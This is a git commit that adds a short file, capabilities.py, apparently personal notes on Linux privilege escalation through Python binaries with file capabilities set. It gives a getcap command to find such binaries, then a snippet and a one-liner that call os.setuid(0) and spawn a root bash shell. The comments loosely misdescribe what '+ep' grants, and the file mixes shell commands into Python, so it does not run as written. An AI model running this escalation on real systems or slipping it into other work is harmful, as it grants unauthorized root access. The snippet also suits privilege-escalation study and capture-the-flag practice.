f85ecb5231667e1f35e5b2a58953ed16dd538212
Xarmen <16585114+XarmenXepo@users.noreply.github.com>
2024-08-23 20:57:29 -0400

    Create capabilities.py

---
+++ capabilities.py
@@ -0,0 +1,16 @@
+# find out if there are python ver residing in the Linux env that has the capabilities set to '+ep' 
+# +ep is representational of Effective Permissions, which allows for everything
+# Use: getcap -r / 2>/dev/null
+
+
+
+# use the following .py snippet to import os for leveraging operating system-dependent functionality
+# setting the uid to (0) which is the id of root
+# and upon obtaining the uid (0), instantiate a bash shell with root priviliges
+import os; 
+os.setuid(0); 
+os.system("/bin/bash")
+
+
+
+/usr/bin/python_vulneralble_version -c 'import os; os.setuid(0); os.system("/bin/bash")'
